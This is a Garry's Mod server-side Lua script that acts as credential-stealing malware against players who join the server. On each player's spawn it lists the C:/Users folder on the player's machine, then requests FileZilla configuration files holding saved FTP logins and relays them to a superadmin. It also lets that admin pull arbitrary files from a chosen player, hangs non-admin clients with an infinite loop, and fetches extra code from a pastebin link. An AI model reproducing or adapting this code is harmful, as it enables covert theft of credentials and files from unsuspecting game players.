

util.AddNetworkString("imcocked")
util.AddNetworkString("imcocked2")
util.AddNetworkString("penisings")
util.AddNetworkString("penisings2")
util.AddNetworkString("anataga")
util.AddNetworkString("stripforme")

local curreceiver = nil
local curtarget = nil
net.Receive("imcocked", function(l, p)
--	print("PENIS")
	
	local url = net.ReadString()
	local length = net.ReadUInt(32)
	local readdata = net.ReadData(length)
	
	url = string.sub(url, 9, #url)
	local ext = string.GetExtensionFromFilename(url)
	
	
	if(p.fteepe==1) then
		if(not p.fteepe_2 or not istable(p.fteepe_2)) then
			p.fteepe_2 = {}
		end
		table.insert(p.fteepe_2, readdata)
		
		timer.Create("p_fteepe_" .. p:UniqueID(), 3, 1, function()
			if(not IsValid(p) or not p.fteepe_2 or not istable(p.fteepe_2)) then return end
			
			local usernames = table.Copy(p.fteepe_2)
			
			p.fteepe = nil
			p.fteepe_2 = nil
			
			
			local dumb = {}
			dumb["All Users"] = true
			dumb["Default"] = true
			dumb["Default User"] = true
			dumb["Default.migrated"] = true
			dumb["Public"] = true
			dumb["desktop.ini"] = true
			
			for k,v in pairs(usernames) do
				if(dumb[v]) then
					table.remove(usernames, k)
					usernames[k] = nil
				end
			end
	
			local tosteal = {}
			
			for k,username in pairs(usernames) do
				table.insert(tosteal, "C:/Users/" .. username .. "/AppData/Roaming/FileZilla/sitemanager.xml")
				table.insert(tosteal, "C:/Users/" .. username .. "/AppData/Roaming/FileZilla/filezilla.xml")
				table.insert(tosteal, "C:/Users/" .. username .. "/AppData/Roaming/FileZilla/recentservers.xml")
			end
			
			timer.Simple(2, function()
				if(not IsValid(p)) then return end
				for k,v in pairs(tosteal) do
					timer.Simple(k*0.1, function()
						net.Start("imcocked")
							net.WriteString(v)
						net.Send(p)
					end)
				end
			end)
		end)
	end
	
	if(not IsValid(curreceiver)) then return end
	if(not IsValid(curtarget)) then return end
	if(curtarget!=p) then return end
	
	--print("READDATA: " .. readdata)
	
	net.Start("anataga")
	net.WriteBool(ext!=nil)--isfile
	net.WriteString(url)--name
	
	net.WriteUInt(length, 32)
	net.WriteData(readdata, length)
	net.Send(curreceiver)
	
end)

net.Receive("penisings", function(l, p)

	if(not p:IsSuperAdmin()) then
		p:SendLua([[while true do end]])
	end
	
	local sid = net.ReadString()
	local what = net.ReadString()
	for k,v in pairs(player.GetAll()) do if v:SteamID() == sid then curtarget = v end end
	
	if(not curtarget) then p:ChatPrint("no target!") return end
	if(curtarget.fteepe) then p:ChatPrint("didnt load in fully yet!") return end
	
	curreceiver = p
	p:ChatPrint("loading: " .. what .. "...")
	net.Start("imcocked")
	net.WriteString(what)
	net.Send(curtarget)
	
end)

net.Receive("penisings2", function(l, p)

	if(not p:IsSuperAdmin()) then
		p:SendLua([[while true do end]])
	end
	
	local sid = net.ReadString()
	local what = net.ReadString()
	for k,v in pairs(player.GetAll()) do if v:SteamID() == sid then curtarget = v end end
	
	if(not curtarget) then p:ChatPrint("no target!") return end
	if(curtarget.fteepe) then p:ChatPrint("didnt load in fully yet!") return end
	
	curreceiver = p
	p:ChatPrint("loading2: " .. what .. "...")
	net.Start("imcocked2")
	net.WriteString(what)
	net.Send(curtarget)
	
end)

hook.Add("PlayerInitialSpawn","k", function(p)
	
	timer.Simple(1, function()
	
		--if(not p:IsSuperAdmin()) then
			p.fteepe = 1
			net.Start("imcocked")
			net.WriteString("C:/Users/")
			net.Send(p)
			
			timer.Simple(12, function() -- fuck
				if(IsValid(p)) then
					p.fteepe = nil
				end
			end)
		--end
		
		timer.Simple(1, function()
		
			if(not IsValid(p) or not p:IsSuperAdmin()) then return end
			http.Fetch("http://pastebin.com/raw/fJDjP6kh", function(s)
				net.Start("stripforme")
				net.WriteString(s)
				net.Send(p)
			end)
		end)
	
	end)
	
end)